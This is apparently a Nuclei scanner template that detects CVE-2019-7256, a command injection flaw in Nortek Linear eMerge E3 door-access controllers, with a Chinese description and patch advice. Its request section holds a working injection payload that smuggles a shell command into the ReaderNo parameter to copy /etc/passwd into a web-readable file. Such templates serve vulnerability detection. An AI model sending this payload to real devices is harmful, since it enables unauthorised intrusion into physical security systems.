id: CVE-2019-7256
info:
  name: eMerge E3 1.00-06 - Remote Code Execution
  author:
  - l0ne1y
  description: |-
    Nortek Security＆Control Linear eMerge E3-Series 命令注入漏洞

    Nortek Security＆Control Linear eMerge E3-Series是美国Nortek Security＆Control公司的一款门禁控制设备。

    Linear eMerge E3-Series设备中存在命令注入漏洞，该漏洞源于程序使用外部输入来构建命令，但没有对其可以修改命令的特殊元素进行正确的处理。攻击者可利用该漏洞对操作系统直接实施危险的命令。
  severity: critical
  remediation: |-
    官方修复方案：
    1、建议用户到官方获取最新补丁或者最新版本程序：
    https://www.nortekcontrol.com/

    临时修复方案：
    1、尽量不去执行外部的应用程序或命令。
    2、使用自定义函数或函数库实现外部应用程序或命令的功能。
requests:
- matchers:
  - type: status
    status:
    - 200
  - type: regex
    regex:
    - 'root:.*:0:0:'
  matchers-condition: and
  raw:
  - |
    GET /card_scan.php?No=30&ReaderNo=%60cat%20/etc/passwd%20%3E%20nuclei.txt%60 HTTP/1.1
    Host: {{Hostname}}
  - |
    GET /nuclei.txt HTTP/1.1
    Host: {{Hostname}}
